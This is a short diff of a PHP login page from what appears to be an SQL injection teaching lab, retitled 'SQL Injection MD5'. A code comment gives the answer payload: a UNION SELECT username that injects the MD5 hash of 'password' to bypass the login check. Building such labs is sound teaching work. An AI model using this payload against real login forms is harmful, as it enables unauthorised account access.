@@ -8,8 +8,8 @@ function error($x){
 }
 if (isset($_POST["username"])){
 	/*
-	username: 	' UNION SELECT 'pass' from users -- '
-	password:	pass
+	username: 	' UNION SELECT '5f4dcc3b5aa765d61d8327deb882cf99' from users -- '
+	password:	password
 	*/
 	
 	include "credentials/iss.php";
@@ -46,7 +46,7 @@ if (isset($_POST["username"])){
 	</head>
 	<body>
 		<div id="bg"></div>
-		<h1>SQL Injection Intro - Login Demo 1 </h1>
+		<h1>SQL Injection MD5 </h1>
 		
 		<?php include "template/login_form.html"; ?>
 	</body>
